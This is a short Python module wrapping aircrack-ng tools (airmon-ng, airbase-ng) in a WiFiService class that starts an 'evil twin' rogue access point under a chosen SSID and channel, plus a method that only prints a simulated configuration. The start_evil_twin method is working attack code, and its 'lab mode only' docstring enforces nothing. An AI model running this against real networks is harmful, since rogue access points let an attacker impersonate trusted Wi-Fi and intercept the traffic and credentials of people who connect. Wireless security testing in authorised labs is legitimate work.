import subprocess
import logging
import os

# -------------------------------
# Helper: Check Command Exists
# -------------------------------
def command_exists(cmd):
    for path in os.environ.get("PATH", "").split(os.pathsep):
        full_path = os.path.join(path, cmd)
        if os.path.exists(full_path) and os.access(full_path, os.X_OK):
            return True
    return False

# -------------------------------
# WiFi Service
# -------------------------------
class WiFiService:
    def __init__(self, interface):
        self.interface = interface

    def check_dependencies(self):
        required = ["airmon-ng", "airbase-ng", "ifconfig"]
        missing = [cmd for cmd in required if not command_exists(cmd)]
        return missing

    def start_evil_twin(self, ssid, channel=6):
        """Execute Evil Twin (lab mode only)."""
        try:
            missing = self.check_dependencies()
            if missing:
                raise EnvironmentError(f"Missing tools: {', '.join(missing)}")

            logging.info(f"[*] Starting Evil Twin: {ssid} on {self.interface}")

            subprocess.call(["airmon-ng", "check", "kill"])
            subprocess.call(["ifconfig", self.interface, "down"])
            subprocess.call(["airmon-ng", "start", self.interface])
            subprocess.call(["airbase-ng", "-e", ssid, "-c", str(channel), self.interface])

            logging.info(f"[SUCCESS] Fake Wi-Fi '{ssid}' started")

        except Exception as e:
            logging.error(f"[ERROR] Failed to start fake Wi-Fi: {e}")

    def simulate_evil_twin(self, ssid, channel=6):
        """Simulate Evil Twin safely."""
        logging.info("[SIMULATION] Evil Twin configuration:")
        logging.info(f"Interface: {self.interface}")
        logging.info(f"SSID: {ssid}")
        logging.info(f"Channel: {channel}")

        print("\n--- SIMULATED WIFI ATTACK ---")
        print(f"Interface: {self.interface}")
        print(f"SSID: {ssid}")
        print(f"Channel: {channel}")
        print("-----------------------------\n")


# -------------------------------
# Optional Direct Test
# -------------------------------
if __name__ == "__main__":
    wifi = WiFiService("wlan0")
    wifi.simulate_evil_twin("Test_WiFi")
